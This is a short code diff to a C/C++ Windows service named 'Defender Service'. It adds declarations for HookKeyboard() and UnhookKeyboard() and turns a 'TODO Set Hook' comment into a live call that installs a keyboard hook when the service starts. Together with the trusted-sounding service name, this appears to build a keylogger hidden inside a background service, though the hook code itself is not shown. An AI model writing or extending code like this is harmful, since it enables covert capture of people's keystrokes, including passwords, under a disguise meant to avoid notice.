@@ -9,6 +9,9 @@ VOID WINAPI ServiceMain (DWORD argc, LPTSTR *argv);
 VOID WINAPI ServiceCtrlHandler (DWORD);
 DWORD WINAPI ServiceWorkerThread (LPVOID lpParam);
 
+boolean HookKeyboard();
+void UnhookKeyboard();
+
 #define SERVICE_NAME  _T("Defender Service")
 
 int SampleServiceMain(int argc, TCHAR *argv[])
@@ -173,7 +176,7 @@ DWORD WINAPI ServiceWorkerThread (LPVOID lpParam)
 {
     OutputDebugString(_T("My Sample Service: ServiceWorkerThread: Entry"));
 
-	// TODO Set Hook
+	HookKeyboard();
 
     //  Periodically check if the service has been requested to stop
     while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0)
@@ -186,7 +189,7 @@ DWORD WINAPI ServiceWorkerThread (LPVOID lpParam)
         Sleep(3000);
     }
 	
-	// Unhook
+	UnhookKeyboard();
 
     OutputDebugString(_T("My Sample Service: ServiceWorkerThread: Exit"));
 
